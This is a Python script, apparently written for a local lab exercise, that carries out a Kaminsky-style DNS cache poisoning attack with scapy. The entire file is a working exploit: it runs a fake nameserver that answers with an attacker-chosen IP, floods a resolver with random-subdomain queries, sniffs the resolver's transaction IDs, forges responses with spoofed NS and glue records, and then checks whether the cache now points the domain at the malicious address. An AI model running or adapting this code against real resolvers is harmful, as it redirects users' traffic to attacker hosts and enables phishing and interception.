#!/usr/bin/env python3
import os
import sys
import time
import json
import socket
import random
import string
import argparse
from threading import Thread
from scapy.all import (
    IP, UDP, DNS, DNSQR, DNSRR,
    send, sr1, RandShort, sniff
)

def run_malicious_dns(domain, malicious_ip, bind_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", bind_port))
    print(f"[*] Fake NS listening on UDP/{bind_port}")
    while True:
        data, addr = sock.recvfrom(512)
        dns_req = DNS(data)
        if dns_req.qr == 0 and dns_req.opcode == 0:
            qn = dns_req[DNSQR].qname.decode().rstrip('.')
            qt = dns_req[DNSQR].qtype
            if qt == 1 and qn.lower() == domain.lower():
                # Answer A record for target domain
                resp = DNS(
                    id=dns_req.id, qr=1, aa=1, rd=0, ra=0, qd=dns_req.qd,
                    ancount=1,
                    an=DNSRR(rrname=domain, type='A',
                             rdata=malicious_ip, ttl=86400)
                )
            else:
                # NXDOMAIN for anything else
                resp = DNS(
                    id=dns_req.id, qr=1, aa=1, rd=0, ra=0, qd=dns_req.qd,
                    rcode=3, ancount=0
                )
            sock.sendto(bytes(resp), addr)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Parallel Kaminsky Attack (settings.json-based)")
    parser.add_argument("-p","--port",   type=int, default=53,   help="resolver port to query")
    parser.add_argument("-n","--ns-port",type=int, default=None, help="YOUR glue-record port (override)")
    parser.add_argument("dns_server",    help="resolver address (e.g. localhost)")
    parser.add_argument("domain",        help="domain to poison")
    parser.add_argument("ip",            help="malicious IP for domain")
    args = parser.parse_args()

    #Resolve the resolver hostname to IP
    try:
        resolver_ip = socket.gethostbyname(args.dns_server)
    except socket.gaierror:
        print(f"[!] Cannot resolve {args.dns_server}")
        sys.exit(1)
    resolver_port = args.port
    domain        = args.domain.rstrip('.')
    malicious_ip  = args.ip
  
    try:
        cfg = json.load(open("settings.json"))
        ns_port = int(cfg["ns_port"])
    except Exception:
        if args.ns_port is None:
            print("[!] Could not read ns_port from settings.json and no -n provided")
            sys.exit(1)
        ns_port = args.ns_port

    glue_port = args.ns_port or ns_port
    port_str  = str(glue_port).zfill(4)
    glue_ip   = ".".join(port_str)

    t_dns = Thread(
        target=run_malicious_dns,
        args=(domain, malicious_ip, ns_port),
        daemon=True
    )
    t_dns.start()

    def on_query(pkt):
        if DNS in pkt and pkt[DNS].qr == 0 and pkt[UDP].dport == ns_port:
            txid = pkt[DNS].id
            sub  = pkt[DNSQR].qname.decode().rstrip('.')
            print(f"[!] Caught subdomain query: {sub} (TXID={txid})")
            spoof = IP(src=resolver_ip, dst=resolver_ip)/UDP(
                sport=53, dport=resolver_port
            )/DNS(
                id=txid, qr=1, aa=1, rd=1, ra=1,
                qd=DNSQR(qname=sub, qtype="A"),
                ancount=0, nscount=1, arcount=1,
                ns=DNSRR(rrname=domain, type="NS", rdata=f"ns.{domain}", ttl=300),
                ar=DNSRR(rrname=f"ns.{domain}", type="A", rdata=glue_ip, ttl=300)
            )
            send(spoof, verbose=0)

    Thread(
        target=lambda: sniff(
            iface="lo",
            filter=f"udp and dst port {ns_port}",
            prn=on_query,
            store=False
        ),
        daemon=True
    ).start()
    print(f"[*] Query‐sniffer active on lo:{ns_port}")

    print("[*] Sending batch of random‐subdomain queries…")
    BATCH_SIZE    = 200
    TOTAL_QUERIES = 500
    batch = []
    for _ in range(TOTAL_QUERIES):
        label = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
        sub   = f"{label}.{domain}"
        batch.append(
            IP(dst=resolver_ip)/UDP(sport=RandShort(), dport=resolver_port)/DNS(
                rd=1, qd=DNSQR(qname=sub, qtype="A")
            )
        )
        if len(batch) >= BATCH_SIZE:
            send(batch, verbose=0)
            batch.clear()
    if batch:
        send(batch, verbose=0)
        batch.clear()

    deadline = time.time() + 240
    while time.time() < deadline:
        test = IP(dst=resolver_ip)/UDP(sport=RandShort(), dport=resolver_port)/DNS(
            rd=1, qd=DNSQR(qname=domain, qtype="A")
        )
        ans = sr1(test, timeout=1, verbose=0)
        if ans and ans.haslayer(DNS) and ans[DNS].ancount > 0:
            out_ip = ans[DNS].an[0].rdata
            if isinstance(out_ip, bytes):
                out_ip = socket.inet_ntoa(out_ip)
            if out_ip == malicious_ip:
                print(f"[+] SUCCESS: {domain} → {malicious_ip}")
                sys.exit(0)
        time.sleep(1)

    print("[!] 4-minute window expired; cache not poisoned.")
    sys.exit(1)
